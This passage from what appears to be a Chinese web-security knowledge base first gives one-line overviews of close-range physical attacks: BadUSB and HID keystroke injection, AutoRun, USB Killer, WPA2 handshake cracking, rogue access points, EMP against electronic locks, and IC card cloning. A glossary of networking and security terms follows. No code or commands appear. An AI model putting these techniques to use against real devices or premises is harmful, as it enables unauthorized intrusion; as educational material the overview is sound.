<p>通过重新编程USB设备的内部微控制器，来执行恶意操作，例如注册为键盘设备，发送特定按键进行恶意操作。</p>
</div>
<div class="section" id="autorun">
<h5>AutoRUN<a class="headerlink" href="#autorun" title="永久链接至标题">¶</a></h5>
<p>根据主机配置的方式，一些操作系统会自动执行位于USB设备存储器上的预定文件。可以通过这种方式执行恶意软件。</p>
</div>
<div class="section" id="usb-killer">
<h5>USB Killer<a class="headerlink" href="#usb-killer" title="永久链接至标题">¶</a></h5>
<p>通过特殊的USB设备基于电气等方式来永久销毁设备。</p>
</div>
<div class="section" id="id2">
<h5>侧信道<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>通过改装USB增加一些监听/测信道传输设备。</p>
</div>
<div class="section" id="hid">
<h5>HID攻击<a class="headerlink" href="#hid" title="永久链接至标题">¶</a></h5>
<p>HID(human interface device)指键盘、鼠标等用于为计算机提供数据输入的人机交互设备。HID攻击指攻击者将特殊的USB设备模拟成为键盘，一旦连接上计算机就执行预定的恶意操作。HID攻击可以基于Android设备、数据线设备等实施。</p>
</div>
</div>
<div class="section" id="wi-fi">
<h4>Wi-Fi<a class="headerlink" href="#wi-fi" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>密码爆破<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>基于WPA2的验证方式，Wi-Fi可以通过抓握手包的方式进行线下的密码爆破。</p>
</div>
<div class="section" id="id4">
<h5>信号压制<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>可以使用大功率的设备捕获握手包并模仿目标AP，从而实现中间人攻击。</p>
</div>
</div>
<div class="section" id="id5">
<h4>门禁<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<div class="section" id="id6">
<h5>电磁脉冲<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>部分电子门禁和电子密码锁的电子系统中集成电路对电磁脉冲比较敏感，可以通过外加电磁脉冲(Electromagnetic Pulse，EMP)的方式破坏设备，来实现打开的效果。</p>
</div>
<div class="section" id="ic">
<h5>IC卡<a class="headerlink" href="#ic" title="永久链接至标题">¶</a></h5>
<p>基于变色龙等设备可以使用模拟、破解、复制IC卡破解门禁。</p>
</div>
</div>
<div class="section" id="id7">
<h4>参考链接<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.secpulse.com/archives/123723.html">近源渗透硬件指北</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/dmh3dDt0BaZYIcWdSTsQcg">红蓝对抗之近源渗透</a></li>
</ul>
</div>
</div>
<span id="document-misc/terminology"></span><div class="section" id="id1">
<h3>常见术语<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>系统相关<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>WMI (Windows Management Instrumentation)</li>
</ul>
</div>
<div class="section" id="id3">
<h4>网络相关<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>网络协议<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>轻型目录访问协议 (Lightweight Directory Access Protocol, LDAP)</li>
<li>标识名 (Distinguished Name, DN)</li>
<li>相对标识名 (Relative Distinguished Name, RDN)</li>
<li>服务器消息块 (Server Message Block, SMB)</li>
<li>网络文件共享系统 (Common Internet File System, CIFS)</li>
<li>SMTP (Simple Mail Transfer Protocol)</li>
<li>简单网络管理协议 (Simple Network Management Protocol, SNMP)</li>
<li>POP3 (Post Office Protocol 3)</li>
<li>IMAP (Internet Mail Access Protocol)</li>
<li>HTTP (HyperText Transfer Protocol)</li>
<li>HTTPS (HyperText Transfer Protocol over Secure Socket Layer)</li>
<li>动态主机配置协议 (Dynamic Host Configuration Protocol, DHCP)</li>
<li>远程过程调用 (Remote Procedure Call, RPC)</li>
<li>Java调试线协议 (Java Debug Wire Protocol, JDWP)</li>
<li>网络文件系统 (Network File System, NFS)</li>
<li>服务主体名称 (Service Principal Names, SPN)</li>
<li>简单身份验证 (Simple Authentication and Security Layer, SASL)</li>
<li>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)</li>
</ul>
</div>
<div class="section" id="id5">
<h5>路由系统<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>自治系统 (Autonomous System, AS)</li>
<li>内部网关协议 (Interior Gateway Protocol, IGP)</li>
<li>外部网关协议 (External Gateway Protocol, EGP)</li>
<li>域内路由选择 (interdomain routing)</li>
<li>域间路由选择 (intradomain routing)</li>
<li>路由信息协议 (Routing Information Protocol, RIP)</li>
<li>开放最短路径优先 (Open Shortest Path First, OSPF)</li>
<li>动态路由协议 (Dynamic Routing Protocols, DRP)</li>
<li>首跳冗余性协议 (First Hop Redundancy Protocols, FHRP)</li>
<li>热备份路由器协议 (Hot Standby Router Protocol, HSRP)</li>
<li>虚拟路由冗余协议 (Virtual Router Redundancy Protocol, VRRP)</li>
<li>网关负载均衡协议 (Gateway Load Balancing Protocol, GLBP)</li>
<li>网络地址转换 (Network Address Translation, NAT)</li>
<li>点对点协议 (Point-to-Point Protocol, PPP)</li>
<li>生成树协议 (Spanning Tree Protocol, STP)</li>
<li>QUIC (Quick UDP Internet Connections)</li>
</ul>
</div>
<div class="section" id="id6">
<h5>网络应用<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>证书透明度 (Certificate Transparency, CT)</li>
<li>DNS证书颁发机构授权 (DNS Certification Authority Authorization, CAA)</li>
<li>应用级网关 (Application Level Gateway, ALG)</li>
</ul>
</div>
<div class="section" id="kerberos">
<h5>Kerberos<a class="headerlink" href="#kerberos" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>密钥分发中心 (Key Distribution Center, KDC)</li>
<li>认证服务器 (Authentication Server, AS)</li>
<li>票据授权服务器 (Ticket Granting Server, TGS)</li>
</ul>
</div>
</div>
<div class="section" id="id7">
<h4>开发相关<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>REST (Representation State Transformation)</li>
<li>持续集成 (Continuous Integration, CI)</li>
<li>持续交付 (Continuous Deployment, CD)</li>
<li>函数即服务 (Function as a Service, FaaS)</li>
<li>容器即服务 (Container as a Service, CaaS)</li>
<li>软件即服务 (Software as a Service, SaaS)</li>
<li>平台即服务 (Platform as a Service, PaaS)</li>
<li>基础设施即服务 (Insfrastructure as a Service, IaaS)</li>
</ul>
</div>
<div class="section" id="id8">
<h4>安全相关<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>缺点 (defect / mistake)</dt>
<dd><ul class="first last">
<li>软件在实现上和设计上的弱点</li>
<li>缺点是缺陷和瑕疵的统称</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>缺陷 (bug)</dt>
<dd><ul class="first last">
<li>实现层面的软件缺点</li>
<li>容易被发现和修复</li>
<li>例如：缓冲区溢出</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>瑕疵 (flaw)</dt>
<dd><ul class="first last">
<li>一种设计上的缺点，难以察觉</li>
<li>瑕疵往往需要人工分析才能发现</li>
<li>软件系统中错误处理或恢复模块，导致程序不安全或失效</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>漏洞 (vulnerability)</dt>
<dd><ul class="first last">
<li>可以用于违反安全策略的缺陷或瑕疵</li>
</ul>
</dd>
</dl>
</li>
<li>IAST (Interactive Application Security Testing)</li>
<li>DAST (Dynamic Application Security Testing)</li>
<li>SAST (Static Application Security Testing)</li>
<li>ATT&amp;CK™ (Adversarial Tactics, Techniques, and Common Knowledge, ATT&amp;CK)</li>
<li>横向移动 (Lateral Movement)</li>
</ul>
<div class="section" id="id9">
<h5>安全开发<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>安全信息和事件管理 (Security Information Event Management, SIEM)</li>
<li>自动化响应SOAR模型 (Security Orchestration, Automation and Response, SOAR)</li>
<li>SDL (Security Development Lifecycle)</li>
</ul>
</div>
<div class="section" id="id10">
<h5>安全策略<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)</li>
<li>发件人策略框架 (Sender Policy Framework, SPF)</li>
<li>域名密钥识别邮件 (DomainKeys Identified Mail, DKIM)</li>
<li>基于域名的消息认证报告与一致性协议 (Domain-based Message Authentication, Reporting and Conformance, DMARC)</li>
<li>DNSSEC (The Domain Name System Security Extensions)</li>
<li>基于DNS的命名实体身份验证 (DNS-based Authentication of Named Entities, DANE)</li>
</ul>
</div>
<div class="section" id="id11">
<h5>安全模型<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>构建安全成熟度模型 (Building Security In Maturity Model, BSIMM)</li>
</ul>
</div>
</div>
<div class="section" id="id12">
<h4>攻击相关<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<div class="section" id="id13">
<h5>漏洞类型<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>跨站脚本攻击 (Cross Site Scripting, XSS)</li>
<li>跨站请求伪造 (Cross-Site Request Forgery, CSRF)</li>
<li>中间人攻击 (Man-in-the-middle, MITM)</li>
<li>服务端请求伪造 (Server Side Request Forgery, SSRF)</li>
<li>高级持续威胁 (Advanced Persistent Threat, APT)</li>
<li>远程命令执行 (Remote Command Execute, RCE)</li>
<li>远程代码执行 (Remote Code Execute, RCE)</li>
<li>带外数据 (Out-Of-Band, OOB)</li>
</ul>
</div>
<div class="section" id="id14">
<h5>攻击方式<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>鱼叉攻击 (Spear Phishing)</li>
<li>水坑攻击 (Water Holing)</li>
<li>分布式拒绝服务 (Distributed Denial of Service, DDoS)</li>
</ul>
</div>
</div>
<div class="section" id="id15">
<h4>防御相关<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>IoC (Indicators of Compromise)</li>
</ul>
<div class="section" id="id16">
<h5>防御技术<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>网络检测响应 (Network-based Detection and Response, NDR)</li>
<li>终端检测响应 (Endpoint Detection and Response, EDR)</li>
<li>托管检测响应 (Managed Detection and Response, MDR)</li>
<li>扩展检测响应 (Extended Detection and Response, XDR)</li>
<li>自适应安全架构 (Adaptive Security Architecture, ASA)</li>
<li>零信任网络访问 (Zero Trust Network Access, ZTNA)</li>
<li>云安全配置管理 (Cloud Security Posture Management, CSPM)</li>
</ul>
</div>
<div class="section" id="id17">
<h5>防护设施<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>入侵检测系统 (Intrusion Detection System, IDS)</li>
<li>主机型入侵检测系统 (Host-based Intrusion Detection System, HIDS)</li>
<li>主机入侵防御系统 (Host Intrusion Prevent System, HIPS)</li>
<li>RASP (Runtime Application Self-protection)</li>
<li>统一端点管理 (Unified Endpoint Management, UEM)</li>
</ul>
</div>
</div>
<div class="section" id="id18">
<h4>运维<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>智能运维 (Artificial Intelligence for IT Operations, AIOps)</li>
<li>风险和脆弱性评估 (Risk and Vulnerability Assessments, RVA)</li>
<li>计算机安全应急响应组 (Computer Emergency Response Team, CERT)</li>
</ul>
</div>
<div class="section" id="id19">
<h4>认证<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>双因素认证 (Two-Factor Authentication, 2FA)</li>
<li>多因素认证 (Multi-Factor Authentication, MFA)</li>
<li>一次性密码 (One-Time Password, OTP)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2019-2021, Lyle
      
        <span class="commit">
          Revision <code>b94f8de3</code>.
        </span>
      

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  

  <div class="rst-versions" data-toggle="rst-versions" role="note" aria-label="versions">
    <span class="rst-current-version" data-toggle="rst-current-version">
      <span class="fa fa-book"> Read the Docs</span>
      v: latest
      <span class="fa fa-caret-down"></span>
    </span>
    <div class="rst-other-versions">
      <dl>
        <dt>Versions</dt>
        
          <dd><a href="/zh/latest/">latest</a></dd>
        
      </dl>
      <dl>
        <dt>Downloads</dt>
        
          <dd><a href="//websec.readthedocs.io/_/downloads/zh/latest/htmlzip/">html</a></dd>
        
      </dl>
      <dl>
        <dt>On Read the Docs</dt>
          <dd>
            <a href="//readthedocs.org/projects/websec/?fromdocs=websec">Project Home</a>
          </dd>
          <dd>
            <a href="//readthedocs.org/builds/websec/?fromdocs=websec">Builds</a>
          </dd>
      </dl>
      <hr/>
      Free document hosting provided by <a href="http://www.readthedocs.org">Read the Docs</a>.

    </div>
  </div>



  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
   

</body>
</html>